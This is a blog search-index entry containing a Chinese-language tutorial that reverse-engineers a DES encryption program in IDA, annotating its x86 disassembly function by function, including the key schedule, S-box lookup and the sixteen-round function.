<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>DES算法逆向分析</title>
    <url>/undefined/DES%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%90.html</url>
    <content><![CDATA[<h1 id="DES算法逆向分析"><a href="#DES算法逆向分析" class="headerlink" title="DES算法逆向分析"></a>DES算法逆向分析</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>了解DES算法的基本流程：</p>
<p><img src="https://img-blog.csdnimg.cn/20210327093613965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/20210327093642767.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="img"></p>
<h3 id="一-用IDA打开，得到汇编代码"><a href="#一-用IDA打开，得到汇编代码" class="headerlink" title="一. 用IDA打开，得到汇编代码"></a>一. 用IDA打开，得到汇编代码</h3><p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210504112827232.png" alt="image-20210504112827232"></p>
<h3 id="二-逐层分析"><a href="#二-逐层分析" class="headerlink" title="二. 逐层分析"></a>二. 逐层分析</h3><h4 id="1-整体初始化"><a href="#1-整体初始化" class="headerlink" title="1. 整体初始化"></a>1. 整体初始化</h4><p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210504112933054.png" alt="image-20210504112933054"></p>
<p>rep stosd之前为栈的初始化，为程序分配栈空间</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov     eax, ds:dword_428458  </span><br><span class="line">mov     dword ptr [ebp+var_C], eax </span><br><span class="line">mov     ecx, ds:dword_42845C</span><br><span class="line">mov     dword ptr [ebp+var_C+4], ecx</span><br><span class="line">mov     dl, ds:byte_428460</span><br><span class="line">mov     [ebp+var_C+8], dl</span><br></pre></td></tr></table></figure>

<p>将dword_428458的值’_3ED’和dword_42845c的值’C1nE’分配到ptr [ebp+var_C+8]数组空间中，并且按照小端存储方式，最终的数组内容为’DE3_En1C’(即为初始密钥)</p>
<p>接下来为调用scanf函数，按照要求‘give me a string to encrypt’ 输入一串字符Str,判断Str长度，如果长度为8则跳转到 short loc_40111D</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">call    _strlen</span><br><span class="line">add     esp, 4</span><br><span class="line">cmp     eax, 8</span><br><span class="line">jz      short loc_40111D</span><br></pre></td></tr></table></figure>

<p>否则执行system(‘pause’)指令,令eax的值为-1，并跳转到loc_4011A6</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push    offset Command  ; &quot;pause&quot;</span><br><span class="line">call    _system</span><br><span class="line">add     esp, 4</span><br><span class="line">or      eax, 0FFFFFFFFh</span><br><span class="line">jmp     loc_4011A6</span><br></pre></td></tr></table></figure>

<p>之后进行整个函数栈的销毁</p>
<h3 id="2-主函数分析"><a href="#2-主函数分析" class="headerlink" title="2. 主函数分析"></a>2. 主函数分析</h3><p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210504172352467.png" alt="image-20210504172352467"></p>
<p>调用了两个函数，首先对call <code>sub_40100F</code>分析，进入函数</p>
<p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210504172452325.png" alt="image-20210504172452325"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">; Attributes: bp-based frame</span><br><span class="line"></span><br><span class="line">sub_401BE0 proc near</span><br><span class="line"></span><br><span class="line">var_EC= <span class="keyword">byte</span> ptr -0ECh</span><br><span class="line">var_AC= dword ptr -0ACh</span><br><span class="line">Src= <span class="keyword">byte</span> ptr -0A8h</span><br><span class="line">var_78= dword ptr -78h</span><br><span class="line">var_5C= dword ptr -5Ch</span><br><span class="line">var_40= <span class="keyword">byte</span> ptr -40h</span><br><span class="line">arg_0= dword ptr  <span class="number">8</span></span><br><span class="line"></span><br><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">sub     esp, 0ECh</span><br><span class="line">push    ebx</span><br><span class="line">push    esi</span><br><span class="line">push    edi</span><br><span class="line">lea     edi, [ebp+var_EC]</span><br><span class="line">mov     ecx, 3Bh</span><br><span class="line">mov     eax, 0CCCCCCCCh</span><br><span class="line">rep stosd    				<span class="comment">//函数栈空间的初始化和分配0ECh大小的空间</span></span><br><span class="line">push    <span class="number">8</span>					<span class="comment">//将8压入栈</span></span><br><span class="line">lea     eax, [ebp+var_40]</span><br><span class="line">push    eax</span><br><span class="line">mov     ecx, [ebp+arg_0]</span><br><span class="line">push    ecx</span><br><span class="line">call    sub_40101E         <span class="comment">//调用sub_40101E函数</span></span><br><span class="line">add     esp, 0Ch</span><br><span class="line">lea     edx, [ebp+var_78]</span><br><span class="line">push    edx</span><br><span class="line">lea     eax, [ebp+var_40]</span><br><span class="line">push    eax</span><br><span class="line">call    sub_401046 		  <span class="comment">//调用sub_401046函数</span></span><br><span class="line">add     esp, <span class="number">8</span></span><br><span class="line">mov     [ebp+var_AC], <span class="number">0</span></span><br><span class="line">jmp     <span class="keyword">short</span> loc_401C3B  </span><br></pre></td></tr></table></figure>

<p>接下来对内部调用的两个函数进行分析</p>
<ol>
<li>进入sub_40101E函数分析：</li>
</ol>
<p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210504181719970.png" alt="image-20210504181719970"></p>
<p>第一块同样为初始化，第二块开始为两层循环，第一层判断ecx计数器次数是否等于[ebp+args_8]的值也就是之前压入栈的8，如果大于等于则跳转到loc_401426进行pop栈销毁，否则进入下一层循环，对应loc_4013F4处，判断是否循环少于8次，少于进入循环内部</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">mov     eax, [ebp+arg_0]    <span class="comment">//将[ebp+arg_0]变量（第一个参数）赋给eax</span></span><br><span class="line">add     eax, [ebp+var_4]   <span class="comment">//eax加上第一层循环的循环变量[ebp+var_4]</span></span><br><span class="line">xor     ecx, ecx          <span class="comment">//ecx清零，也就是第二层循环重新开始</span></span><br><span class="line">mov     cl, [eax]         <span class="comment">//eax值赋给cl段</span></span><br><span class="line">mov     edx, ecx          <span class="comment">//上一层的ecx值赋给edx</span></span><br><span class="line">mov     ecx, <span class="number">7</span>            <span class="comment">//ecx的值赋为7</span></span><br><span class="line">sub     ecx, [ebp+var_8]   <span class="comment">//ecx(7)减第二层循环变量[ebp+var_8]</span></span><br><span class="line">sar     edx, cl            <span class="comment">//将edx的值算数右移cl位</span></span><br><span class="line">and     edx, <span class="number">1</span>             <span class="comment">//将右移后edx值和1进行按位与运算</span></span><br><span class="line">mov     eax, [ebp+var_4]   <span class="comment">//将第一层循环变量值赋给eax</span></span><br><span class="line">mov     ecx, [ebp+var_8]   <span class="comment">//将第二层循环变量值赋给ecx</span></span><br><span class="line">lea     eax, [ecx+eax*<span class="number">8</span>]   <span class="comment">//8*eax+ecx并装入eax</span></span><br><span class="line">mov     ecx, [ebp+arg_4]   <span class="comment">//第二个参数赋给ecx</span></span><br><span class="line">mov     [ecx+eax], dl       <span class="comment">//之前算出(右移，与运算）的dx寄存器内（低8位）的值赋给ecx和eax值的和</span></span><br><span class="line">jmp     <span class="keyword">short</span> loc_4013EB    <span class="comment">//跳转到loc_4013E8</span></span><br></pre></td></tr></table></figure>

<p>loc_4013E8函数内进行第二层循环变量自增，loc_4013D1函数内为第一层循环变量的自增。</p>
<h4 id=""><a href="#" class="headerlink" title=""></a></h4><ol start="2">
<li>进入sub_401046函数分析：</li>
</ol>
<p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210504185044393.png" alt="image-20210504185044393"></p>
<p>直接看第二块循环语句，循环38h(56)次，在循环内：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">mov     ecx, [ebp+var_4]     </span><br><span class="line">movsx (带符号扩展)  edx, ds:byte_4280EC[ecx]</span><br><span class="line">mov     eax, [ebp+arg_4]   </span><br><span class="line">add     eax, [ebp+var_4]   <span class="comment">//第二个形参加上循环变量[ebp+var_4]，并存到eax</span></span><br><span class="line">mov     ecx, [ebp+arg_0]</span><br><span class="line">mov     dl, [ecx+edx-<span class="number">1</span>]   </span><br><span class="line">mov     [eax], dl</span><br><span class="line">jmp     <span class="keyword">short</span> loc_401A51</span><br></pre></td></tr></table></figure>

<p>实现的功能为：将byte_4280EC[]数组(最大56轮)的值加上函数第一个形参ecx，再减1，将值存到dl寄存器，再将dl的值赋给eax所指向内存单元的字节数，之后循环变量自增。</p>
<p>回到主函数第二块分析：是一个for循环语句，判断循环变量[ebp+var_AC]的值是否等于（10h)16，如果大于等于16则跳转到loc_401CB9,进行函数栈销毁，小于则进入循环</p>
<p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210504175950394.png" alt="image-20210504175950394"></p>
<p>进入循环内部：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">mov     edx, [ebp+var_AC]</span><br><span class="line">movsx   eax, ds:byte_428154[edx]</span><br><span class="line">push    eax             ; <span class="keyword">int</span></span><br><span class="line">lea     ecx, [ebp+var_78]</span><br><span class="line">push    ecx             ; <span class="keyword">int</span></span><br><span class="line">lea     edx, [ebp+var_78]</span><br><span class="line">push    edx             ; Src</span><br><span class="line">call    sub_401014   				<span class="comment">//对[ebp+var_78]调用sub_401014函数</span></span><br><span class="line">add     esp, 0Ch</span><br><span class="line">mov     eax, [ebp+var_AC]</span><br><span class="line">movsx   ecx, ds:byte_428154[eax]</span><br><span class="line">push    ecx             ; <span class="keyword">int</span></span><br><span class="line">lea     edx, [ebp+var_5C]</span><br><span class="line">push    edx             ; <span class="keyword">int</span></span><br><span class="line">lea     eax, [ebp+var_5C]</span><br><span class="line">push    eax             ; Src</span><br><span class="line">call    sub_401014					 <span class="comment">//第二次调用sub_401014函数,参数为[ebp+var_5C]和byte_428154[eax]</span></span><br><span class="line">add     esp, 0Ch</span><br><span class="line">lea     ecx, [ebp+Src]</span><br><span class="line">push    ecx</span><br><span class="line">lea     edx, [ebp+var_78]</span><br><span class="line">push    edx</span><br><span class="line">call    sub_40100A					<span class="comment">//调用sub_40100A，参数为[ebp+var_78]和Src</span></span><br><span class="line">add     esp, <span class="number">8</span></span><br><span class="line">push    30h ; <span class="string">&#x27;0&#x27;</span>       ; Size		<span class="comment">//将48压入栈</span></span><br><span class="line">lea     eax, [ebp+Src]</span><br><span class="line">push    eax             ; Src</span><br><span class="line">mov     ecx, [ebp+var_AC]</span><br><span class="line">imul    ecx, 30h ; <span class="string">&#x27;0&#x27;</span>              </span><br><span class="line">add     ecx, offset unk_42DC9C     <span class="comment">//将ecx计数器的值和48相乘再加上地址为unk_42DC9C处的值，结果存到ecx</span></span><br><span class="line">push    ecx             ; <span class="keyword">void</span> *</span><br><span class="line">call    _memcpy			            <span class="comment">//调用memcpy函数</span></span><br><span class="line">add     esp, 0Ch</span><br><span class="line">jmp     loc_401C2C                 <span class="comment">//之后是循环变量自增</span></span><br></pre></td></tr></table></figure>

<p>对调用的函数依次分析：</p>
<ol>
<li><p>进入sub_401014</p>
<p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210504190902400.png" alt="&#39;image-20210504190902400&#39;"></p>
</li>
</ol>
<p>对第一块，分配64h大小的空间调用memcpy函数，将Src字符串的内容赋给[ebp+var_1c]数组，将变量[ebp+var_24](用v4表示）初始化为0，接下来为while循环，[ebp+var_20]（用v5表示）为循环变量，循环大小为1Ch即28，在while循环内部</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">mov     ecx, [ebp+arg_4]       </span><br><span class="line">add     ecx, [ebp+var_24]      <span class="comment">//第二个形参和v4相加，存到ecx</span></span><br><span class="line">mov     edx, [ebp+var_20]       <span class="comment">//v5赋给edx</span></span><br><span class="line">mov     al, [ebp+edx+var_1C]   <span class="comment">//在数组内寻找v5指向的字节，存到al寄存器</span></span><br><span class="line">mov     [ecx], al              <span class="comment">//将al寄存器的值赋给ecx指向在内存的字节</span></span><br><span class="line">mov     ecx, [ebp+var_24]  </span><br><span class="line">add     ecx, <span class="number">1</span>                <span class="comment">//v4自增</span></span><br><span class="line">mov     [ebp+var_24], ecx</span><br><span class="line">jmp     <span class="keyword">short</span> loc_401B49</span><br></pre></td></tr></table></figure>

<p>之后是一个for循环</p>
<p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210504191827485.png" alt="image-20210504191827485"></p>
<p>for循环内，判断循环变量[ebp+var_20]是否大于等于第三个形参[ebp+arg_8]，若大于等于则跳出循环（add esp,64h)，否则和while循环内容实现功能相同。</p>
<ol start="2">
<li>进入sub_40100A函数</li>
</ol>
<p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210504193240015.png" alt="image-20210504193240015"></p>
<p>是一个for 循环，循环大小为30h（48），循环变量为[ebp+var_4]（用i表示），先初始化为0</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">mov     ecx, [ebp+var_4]</span><br><span class="line">movsx   edx, ds:byte_428124[ecx]   <span class="comment">//按i指向的字节数组byte的对应值赋给edx</span></span><br><span class="line">mov     eax, [ebp+arg_4]  </span><br><span class="line">add     eax, [ebp+var_4]    <span class="comment">//i+第二个参数[ebp+arg_4],存到eax</span></span><br><span class="line">mov     ecx, [ebp+arg_0]    <span class="comment">//第一个形参存到ecx</span></span><br><span class="line">mov     dl, [ecx+edx-<span class="number">1</span>]   <span class="comment">// edx的值和第一个形参指向内存的字节单元值存到dl寄存器</span></span><br><span class="line">mov     [eax], dl         <span class="comment">//dl寄存器的值赋给eax指向内存的字节单元</span></span><br><span class="line">jmp     <span class="keyword">short</span> loc_401AC1</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>memcpy函数实现将Src字符串的值赋给ecx寄存器内的值，大小为48u</li>
</ol>
<p>回到主函数:</p>
<h4 id="轮函数sub-401032"><a href="#轮函数sub-401032" class="headerlink" title="轮函数sub_401032"></a>轮函数sub_401032</h4><p>分析调用的第二个函数call sub_401032：</p>
<p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210504195227264.png" alt="image-20210504195227264"></p>
<p>第一块：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">sub     esp, 0E4h</span><br><span class="line">push    ebx</span><br><span class="line">push    esi</span><br><span class="line">push    edi</span><br><span class="line">lea     edi, [ebp+var_E4]</span><br><span class="line">mov     ecx, 39h</span><br><span class="line">mov     eax, 0CCCCCCCCh  </span><br><span class="line">rep stosd  							<span class="comment">//初始化</span></span><br><span class="line">push    <span class="number">8</span></span><br><span class="line">lea     eax, [ebp+Src]</span><br><span class="line">push    eax</span><br><span class="line">mov     ecx, [ebp+arg_0]</span><br><span class="line">push    ecx    </span><br><span class="line">call    sub_40101E      			<span class="comment">//调用sub_40101E函数</span></span><br><span class="line">add     esp, 0Ch</span><br><span class="line">lea     edx, [ebp+Src]</span><br><span class="line">push    edx             ; <span class="keyword">int</span></span><br><span class="line">lea     eax, [ebp+Src]</span><br><span class="line">push    eax             ; Src</span><br><span class="line">call    sub_401028  				<span class="comment">//调用sub_401028函数</span></span><br><span class="line">add     esp, <span class="number">8</span></span><br><span class="line">push    20h(<span class="number">32</span>) ; <span class="string">&#x27; &#x27;</span>       ; Size</span><br><span class="line">lea     ecx, [ebp+Src]</span><br><span class="line">push    ecx             ; Src</span><br><span class="line">lea     edx, [ebp+var_84]</span><br><span class="line">push    edx             ; <span class="keyword">void</span> *</span><br><span class="line">call    _memcpy                   <span class="comment">//</span></span><br><span class="line">add     esp, 0Ch</span><br><span class="line">push    20h (<span class="number">32</span>); <span class="string">&#x27; &#x27;</span>       ; Size     </span><br><span class="line">lea     eax, [ebp+var_24]</span><br><span class="line">push    eax             ; Src</span><br><span class="line">lea     ecx, [ebp+var_A4]</span><br><span class="line">push    ecx             ; <span class="keyword">void</span> *</span><br><span class="line">call    _memcpy					  <span class="comment">//调用两次memcpy函数</span></span><br><span class="line">add     esp, 0Ch</span><br><span class="line">mov     [ebp+var_4], <span class="number">0</span></span><br><span class="line">jmp     <span class="keyword">short</span> loc_40124C</span><br></pre></td></tr></table></figure>

<ol>
<li><p>对于sub_40101E函数，之前已经分析过，可知其实现功能为：</p>
</li>
<li><p>对于sub_401028函数</p>
<p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210504201219915.png" alt="image-20210504201219915"></p>
</li>
</ol>
<p>在第一块，先调用了mempy函数将Src内容拷贝给了</p>
<p>第二块为一个循环语句，进行40h（64）轮循环，在每轮循环中，将byte_42801C数组对应得值加上[ebp+var_45]指向内存的值，并将值赋给循环变量[ebp+var_4]和[ebp+arg_4]的和（这里的函数功能与之前的类似，简要说明）</p>
<ol start="3">
<li><p>接下来调用了两次memcpy函数</p>
</li>
<li><p>之后进行了15轮循环</p>
<p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210504202117422.png" alt="image-20210504202117422"></p>
</li>
</ol>
<p>观察发现，在循环内和循环外，都调用了sub_401005,sub_401023函数，对于</p>
<h5 id="sub-401005函数："><a href="#sub-401005函数：" class="headerlink" title="sub_401005函数："></a>sub_401005函数：</h5><p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210504204745766.png" alt="image-20210504204745766"></p>
<p>发现依次调用了sub_40104B, sub_401023, sub_40103C，sub_401037函数，并在最后调用了memcpy函数，将Src的值赋值给了[ebp+arg_4]</p>
<p>依次分析：</p>
<h6 id="i-sub-40104B"><a href="#i-sub-40104B" class="headerlink" title="(i) sub_40104B"></a>(i) sub_40104B</h6><p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210504205118176.png" alt="image-20210504205118176"></p>
<p>首先调用了memcpy函数，将Src的值赋给了[ebp+var_30]，看第二块发现是for循环，循环48次，在循环内</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">mov     eax, [ebp+var_34]            <span class="comment">//循环变量[ebp+var_34]（用i表示）</span></span><br><span class="line">movsx   ecx, ds:byte_42809C[eax]     <span class="comment">//i对应的byte_42809C的值存到ecx</span></span><br><span class="line">mov     edx, [ebp+arg_4]</span><br><span class="line">add     edx, [ebp+var_34]            <span class="comment">//i与[ebp+arg_4]相加</span></span><br><span class="line">mov     al, <span class="keyword">byte</span> ptr [ebp+ecx+var_34+<span class="number">3</span>] <span class="comment">//ecx+3+i对应的字节数组赋给i与[ebp+arg_4]的和</span></span><br><span class="line">mov     [edx], al</span><br><span class="line">jmp     <span class="keyword">short</span> loc_401693</span><br></pre></td></tr></table></figure>



<h6 id="ii-sub-401023函数"><a href="#ii-sub-401023函数" class="headerlink" title="(ii) sub_401023函数"></a>(ii) sub_401023函数</h6><p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210504203429412.png" alt="image-20210504203429412"></p>
<p>同样为一个for循环，循环次数为[ebp+arg_8]对应的值（即32次），在循环内部</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">mov     edx, [ebp+arg_0]    </span><br><span class="line">add     edx, [ebp+var_4]   <span class="comment">//循环变量与[ebp+arg_0]相加</span></span><br><span class="line">xor     eax, eax          <span class="comment">//eax清零</span></span><br><span class="line">mov     al, [edx]         <span class="comment">//存到al</span></span><br><span class="line">mov     ecx, [ebp+arg_4]  </span><br><span class="line">add     ecx, [ebp+var_4]  <span class="comment">//循环变量与[ebp+arg_4]相加</span></span><br><span class="line">xor     edx, edx          <span class="comment">//edx清零</span></span><br><span class="line">mov     dl, [ecx]         <span class="comment">//存到dl</span></span><br><span class="line">add     eax, edx          <span class="comment">//两次结果相加</span></span><br><span class="line">and     eax, <span class="number">1</span>            <span class="comment">//和与1按位与</span></span><br><span class="line">mov     ecx, [ebp+arg_0]</span><br><span class="line">add     ecx, [ebp+var_4]    </span><br><span class="line">mov     [ecx], al         <span class="comment">//和赋给（循环变量和[ebp+var_arg0]的和）</span></span><br><span class="line">jmp     <span class="keyword">short</span> loc_401921</span><br></pre></td></tr></table></figure>



<h6 id="iii-sub-40103C"><a href="#iii-sub-40103C" class="headerlink" title="(iii) sub_40103C"></a>(iii) sub_40103C</h6><p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210504205824037.png" alt="image-20210504205824037"></p>
<p>第二块：while循环，[ebp+var_4]为循环变量（用i表示），循环8次，在循环内</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">mov     ecx, [ebp+var_4]</span><br><span class="line">imul    ecx, <span class="number">6</span>         				<span class="comment">//6*i</span></span><br><span class="line">mov     edx, [ebp+arg_0]     </span><br><span class="line">xor     eax, eax               <span class="comment">//eax清零</span></span><br><span class="line">mov     al, [edx+ecx]</span><br><span class="line">shl     eax, <span class="number">1</span>					<span class="comment">//左移1位</span></span><br><span class="line">mov     ecx, [ebp+var_4]</span><br><span class="line">imul    ecx, <span class="number">6</span>                 <span class="comment">//6*i</span></span><br><span class="line">mov     edx, [ebp+arg_0]        </span><br><span class="line">xor     ebx, ebx        		<span class="comment">//ebx清零</span></span><br><span class="line">mov     bl, [edx+ecx+<span class="number">5</span>]         <span class="comment">//和+5</span></span><br><span class="line">or      eax, ebx                <span class="comment">//eax和ebx进行或运算</span></span><br><span class="line">and     eax, <span class="number">3</span>    				<span class="comment">//eax和3按位与</span></span><br><span class="line"></span><br><span class="line">mov     [ebp+var_C], eax</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">imul    eax, <span class="number">6</span>          </span><br><span class="line">mov     ecx, [ebp+arg_0]</span><br><span class="line">xor     edx, edx</span><br><span class="line">mov     dl, [ecx+eax+<span class="number">1</span>]</span><br><span class="line">shl     edx, <span class="number">3</span>                   <span class="comment">//左移3位</span></span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">imul    eax, <span class="number">6</span></span><br><span class="line">mov     ecx, [ebp+arg_0]</span><br><span class="line">xor     ebx, ebx                <span class="comment">//ebx清零</span></span><br><span class="line">mov     bl, [ecx+eax+<span class="number">2</span>]</span><br><span class="line">shl     ebx, <span class="number">2</span></span><br><span class="line">or      edx, ebx</span><br><span class="line">mov     eax, [ebp+var_4]        </span><br><span class="line">imul    eax, <span class="number">6</span>         </span><br><span class="line">mov     ecx, [ebp+arg_0]</span><br><span class="line">xor     ebx, ebx</span><br><span class="line">mov     bl, [ecx+eax+<span class="number">3</span>]</span><br><span class="line">shl     ebx, <span class="number">1</span>				<span class="comment">//左移1位</span></span><br><span class="line">or      edx, ebx</span><br><span class="line">mov     eax, [ebp+var_4]</span><br><span class="line">imul    eax, <span class="number">6</span></span><br><span class="line">mov     ecx, [ebp+arg_0]</span><br><span class="line">xor     ebx, ebx</span><br><span class="line">mov     bl, [ecx+eax+<span class="number">4</span>]</span><br><span class="line">or      edx, ebx</span><br><span class="line">and     edx, 0Fh（<span class="number">15</span>）			<span class="comment">//与15按位与</span></span><br><span class="line"></span><br><span class="line">mov     [ebp+var_10], edx</span><br><span class="line">mov     edx, [ebp+var_4]</span><br><span class="line">shl     edx, <span class="number">6</span></span><br><span class="line">mov     eax, [ebp+var_C]</span><br><span class="line">shl     eax, <span class="number">4</span></span><br><span class="line">mov     ecx, [ebp+var_10]</span><br><span class="line">add     ecx, edx</span><br><span class="line">movsx   edx, ds:byte_428164[eax+ecx]</span><br><span class="line">and     edx, 0Fh（<span class="number">15</span>）</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">v3 &#x3D; byte_428164[64 * v5</span><br><span class="line">                   + 16 * ((*(_BYTE *)(a1 + 6 * v5 + 5) | (unsigned __int8)(2 * *(_BYTE *)(a1 + 6 * v5))) &amp; 3)</span><br><span class="line">                   + ((*(_BYTE *)(a1 + 6 * v5 + 4) | (unsigned __int8)((2 * *(_BYTE *)(a1 + 6 * v5 + 3)) | (4 * *(_BYTE *)(a1 + 6 * v5 + 2)) | (8 * *(_BYTE *)(a1 + 6 * v5 + 1)))) &amp; 15)] &amp; 15;</span><br></pre></td></tr></table></figure>

<p>大致运算如上</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">mov     [ebp+var_14], dl</span><br><span class="line">movsx   eax, [ebp+var_14]</span><br><span class="line">sar<span class="comment">//右移     eax, 3</span></span><br><span class="line">and     eax, <span class="number">1</span></span><br><span class="line">mov     ecx, [ebp+arg_4]</span><br><span class="line">add     ecx, [ebp+var_8]</span><br><span class="line">mov     [ecx], al</span><br><span class="line">movsx   edx, [ebp+var_14]</span><br><span class="line">sar     edx, <span class="number">2</span></span><br><span class="line">and     edx, <span class="number">1</span></span><br><span class="line">mov     eax, [ebp+arg_4]</span><br><span class="line">add     eax, [ebp+var_8]</span><br><span class="line">mov     [eax+<span class="number">1</span>], dl</span><br><span class="line">movsx   ecx, [ebp+var_14]</span><br><span class="line">sar     ecx, <span class="number">1</span></span><br><span class="line">and     ecx, <span class="number">1</span></span><br><span class="line">mov     edx, [ebp+arg_4]</span><br><span class="line">add     edx, [ebp+var_8]</span><br><span class="line">mov     [edx+<span class="number">2</span>], cl</span><br><span class="line">movsx   eax, [ebp+var_14]</span><br><span class="line">and     eax, <span class="number">1</span></span><br><span class="line">mov     ecx, [ebp+arg_4]</span><br><span class="line">add     ecx, [ebp+var_8]</span><br><span class="line">mov     [ecx+<span class="number">3</span>], al</span><br><span class="line">mov     edx, [ebp+var_8]</span><br><span class="line">add     edx, <span class="number">4</span></span><br><span class="line">mov     [ebp+var_8], edx</span><br><span class="line">jmp     loc_401718</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">*(_BYTE *)(v4 + a2) = (v3 &gt;&gt; <span class="number">3</span>) &amp; <span class="number">1</span>;</span><br><span class="line">    *(_BYTE *)(v4 + a2 + <span class="number">1</span>) = (v3 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">1</span>;</span><br><span class="line">    *(_BYTE *)(v4 + a2 + <span class="number">2</span>) = (v3 &gt;&gt; <span class="number">1</span>) &amp; <span class="number">1</span>;</span><br><span class="line">    *(_BYTE *)(v4 + a2 + <span class="number">3</span>) = v3 &amp; <span class="number">1</span>;</span><br><span class="line">	v4 += <span class="number">4</span>;</span><br><span class="line">    result = ++v5;</span><br></pre></td></tr></table></figure>

<p>大致运算如上</p>
<h6 id="iiii-sub-401037"><a href="#iiii-sub-401037" class="headerlink" title="(iiii) sub_401037"></a>(iiii) sub_401037</h6><p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210504211153608.png" alt="image-20210504211153608"></p>
<p>先调用memcpy函数将Src赋值给[ebp+var_20]</p>
<p>之后进行(20h)32轮循环，实现功能与sub_401014类似，这里不做重复说明</p>
<p>在sub_401032函数末尾</p>
<p>返回了sub_40102D函数</p>
<p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210504212306639.png" alt="image-20210504212306639"></p>
<p>有两层for循环，一层循环次数为[ebp+arg_8]，第二层循环次数为7，第一层循环：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">mov     edx, [ebp+var_4]    <span class="comment">//第一层循环变量i</span></span><br><span class="line">mov     eax, [ebp+arg_0]</span><br><span class="line">xor     ecx, ecx</span><br><span class="line">mov     cl, [eax+edx*<span class="number">8</span>]       </span><br><span class="line">and     ecx, <span class="number">1</span>             <span class="comment">//([ebp+arg_0]+8*i)与1相与</span></span><br><span class="line">mov     <span class="keyword">byte</span> ptr [ebp+var_C], cl       <span class="comment">//结果存到[ebp+avr_C]</span></span><br><span class="line">mov     [ebp+var_8], <span class="number">1</span>     <span class="comment">//初始化第二层循环变量[ebp+var_8](用j表示)为1</span></span><br><span class="line">jmp     <span class="keyword">short</span> loc_4014A5</span><br></pre></td></tr></table></figure>

<p>跳转到下一层循环：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">mov     eax, [ebp+var_C]</span><br><span class="line">and     eax, 0FFh              </span><br><span class="line">shl     eax, <span class="number">1</span>          <span class="comment">//eax左移1位即eax乘2     </span></span><br><span class="line">mov     <span class="keyword">byte</span> ptr [ebp+var_C], al</span><br><span class="line">mov     ecx, [ebp+var_C]</span><br><span class="line">and     ecx, 0FFh</span><br><span class="line">mov     edx, [ebp+var_4]</span><br><span class="line">mov     eax, [ebp+var_8]</span><br><span class="line">lea     edx, [eax+edx*<span class="number">8</span>]     <span class="comment">//(a+j+8*i)</span></span><br><span class="line">mov     eax, [ebp+arg_0]</span><br><span class="line">xor     ebx, ebx</span><br><span class="line">mov     bl, [eax+edx]   <span class="comment">//结果存到bx寄存器低位</span></span><br><span class="line">and     ebx, <span class="number">1</span>    <span class="comment">//</span></span><br><span class="line">add     ecx, ebx</span><br><span class="line">mov     <span class="keyword">byte</span> ptr [ebp+var_C], cl   <span class="comment">//cl赋给ptr[ebp+var_C]</span></span><br><span class="line">jmp     <span class="keyword">short</span> loc_40149C</span><br></pre></td></tr></table></figure>

<p>到此sub_401032函数分析完毕，可知该函数为16次轮函数</p>
<p>回到主函数：</p>
<p><img src="C:\Users\徐锐\AppData\Roaming\Typora\typora-user-images\image-20210504213924371.png" alt="image-20210504213924371"></p>
<p>第二块开始为for循环，[ebp+var2C]为循环变量，循环8次</p>
